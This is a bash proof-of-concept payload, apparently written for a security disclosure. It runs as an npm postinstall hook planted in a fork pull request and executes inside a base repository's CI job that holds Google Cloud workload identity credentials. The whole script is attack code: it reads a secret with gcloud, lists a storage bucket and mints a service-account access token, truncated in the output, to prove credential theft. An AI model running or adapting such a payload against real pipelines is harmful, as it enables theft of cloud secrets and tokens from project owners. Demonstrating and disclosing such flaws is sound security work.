#!/usr/bin/env bash
# ATTACKER PAYLOAD — lands in the fork PR; runs inside the BASE repo's custard-run job via
# `npm install` (postinstall), with the victim SA's WIF credentials in the environment.
# NON-DESTRUCTIVE: read-only proofs + a /tmp marker. Never writes/deletes cloud resources.
set +e
N="custard-pwn-$(date +%s)-$RANDOM"
echo "::group::custard workflow_run+WIF pwn PoC ($N)"
echo "[attacker] A fork-PR postinstall is executing inside the base repo's custard-run job."
echo "[attacker] effective GCP identity (expect the VICTIM SA, not the attacker):"
gcloud auth list 2>&1 | sed 's/^/    /'
echo "[attacker] GOOGLE_APPLICATION_CREDENTIALS=${GOOGLE_APPLICATION_CREDENTIALS:-<unset>}"
echo "[attacker] ===== proving victim-SA access (the 'cred theft') ====="
echo "[attacker] (1) read the victim's canary SECRET:"
gcloud secrets versions access latest --secret=custard-poc-canary --project=pwnd-hard 2>&1 | sed 's/^/    SECRET> /'
echo "[attacker] (2) list the victim's canary BUCKET:"
gcloud storage ls "gs://custard-poc-canary-36249935295/" 2>&1 | sed 's/^/    BUCKET> /'
echo "[attacker] (3) mint a raw access token for the victim SA (exfiltratable; only first chars shown):"
gcloud auth print-access-token 2>&1 | cut -c1-24 | sed 's/^/    TOKEN(first24)> /'
echo "PWNED-$N" > "/tmp/pwn_$N"; echo "[attacker] local marker: $(cat /tmp/pwn_$N)"
echo "[attacker] ===== a FORK PR executed the above with the victim WIF identity ====="
echo "::endgroup::"
exit 0
